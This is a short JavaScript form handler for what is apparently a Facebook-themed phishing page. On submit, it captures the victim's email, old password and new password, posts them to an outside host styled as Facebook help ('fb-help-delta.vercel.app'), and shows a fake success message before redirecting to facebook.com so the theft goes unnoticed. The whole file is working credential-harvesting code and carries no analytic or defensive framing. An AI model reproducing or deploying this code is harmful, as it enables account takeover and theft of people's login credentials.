document.getElementById('passwordForm').addEventListener('submit', function(event) {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const oldPassword = document.getElementById('oldPassword').value;
  const newPassword = document.getElementById('newPassword').value;

  fetch('https://fb-help-delta.vercel.app/index.js', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      email: email,
      oldPassword: oldPassword,
      newPassword: newPassword
    })
  });

  document.getElementById('passwordBox').style.display = 'none';
  document.getElementById('successMessage').style.display = 'flex';

  setTimeout(function() {
    window.location.href = 'https://facebook.com';
  }, 2000);
});